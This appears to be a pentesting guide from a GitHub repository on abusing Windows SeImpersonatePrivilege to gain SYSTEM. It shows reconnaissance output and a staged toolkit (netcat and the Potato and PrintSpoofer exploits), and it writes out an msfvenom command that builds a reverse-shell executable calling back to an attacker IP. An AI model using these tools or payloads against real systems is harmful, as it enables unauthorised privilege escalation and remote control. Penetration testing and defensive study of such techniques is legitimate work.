# how to exploit SeImpersonatePrivilege in windows machine during pentesting 

How to exploit SeImpersonatePrivilege with different ways, it is also gud to check what version of operating system were dealing with
```
C:\Users\Public\Desktop>systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
Host Name:                 REMOTE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
System Type:               x64-based PC
Hotfix(s):                 4 Hotfix(s) Installed.
```

#### Assume you have exploit a windows operating system either a AD or normal windows machine successfull got access and once you run the **whoami/priv** you find that you can exploit to **nt authority\system**  throught tokenImpersonate, there many ways do this but when doing pentesting, in this blog am going to upload every technique i use when i meet this enviroment when approaching a target.

## Take an example
```
C:\Users\Public\desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\Users\Public\desktop>
```

From the above scenarion there many ways you can try to exploit this but actually i am making this one so i can easy simplfy my way in with this easy way to become administrator.

## first thing were gonna need is transfering the following binaries into our target machine 
1. nc.exe (specific for windows) - [windows netcat](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/nc.exe) - 🖥️ netcat binary download
2. RoguePotato.exe - [RoguePotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/RoguePotato.md) - 🖥️ roguepotato binary usage
3. JuicyPotato - [JuicyPotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/JuicyPotato.md) - 🖥️ JuicyPotato binary usage
4. payload with msfvenom specific for windows(msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe)
5. PrintSpoofer - [PrintSpoofer.md](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/PrintSpoofer.md) - 🖥️ PrintSpoofer binary usage
6. GodPotato - [GodPotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/Godpotato.md) - 🖥️ GodPotato binary usage

```
C:\Users\Public\desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D582-9880

 Directory of C:\Users\Public\desktop

04/13/2024  08:59 AM    <DIR>          .
04/13/2024  08:59 AM    <DIR>          ..
04/13/2024  07:23 AM    <DIR>          Microsoft
04/13/2024  06:59 AM            59,392 nc.exe
04/13/2024  07:23 AM           347,648 potato.exe
04/13/2024  08:59 AM           159,232 rogue.exe
04/13/2024  07:28 AM             7,168 shell.exe
04/13/2024  08:39 AM            27,136 spoofer.exe
02/20/2020  03:14 AM             1,191 TeamViewer 7.lnk
               7 File(s)        601,801 bytes

        3 Dir(s)  13,362,515,968 bytes free
```
Everything required is available here no need to search for them online anymore, just this repostory is enough to go for root/administrator



# references
```
The following are the references i have used to create everything here

1.https://github.com/itm4n/PrintSpoofer/releases
2. https://github.com/ohpe/juicy-potato
3. https://github.com/antonioCoco/RoguePotato/tree/master/RoguePotato
4. https://github.com/k4sth4/Rogue-Potato/blob/main/RoguePotato.exe
5. https://juggernaut-sec.com/seimpersonateprivilege/
6. https://github.com/BeichenDream/GodPotato
7. https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/
8. https://github.com/antonioCoco/RoguePotato/tree/master
9. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens

```

